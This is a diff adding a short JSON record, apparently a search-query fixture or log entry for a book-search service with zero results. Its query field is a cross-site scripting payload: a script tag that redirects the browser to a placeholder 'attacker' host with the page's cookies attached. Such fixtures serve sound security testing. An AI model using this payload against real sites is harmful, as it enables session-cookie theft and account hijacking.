@@ -1,0 +1,7 @@
+{
+    "id": "9209b672fa510a2e32861a698f40d6faada13bdbdd6da7848852621dffb87d63",
+    "query": "<script>window.location=\"http://attacker/?cookie=\"+document.cookie</script>",
+    "resultsMetadata": [
+    ],
+    "resultsNumBooks": 0
+}
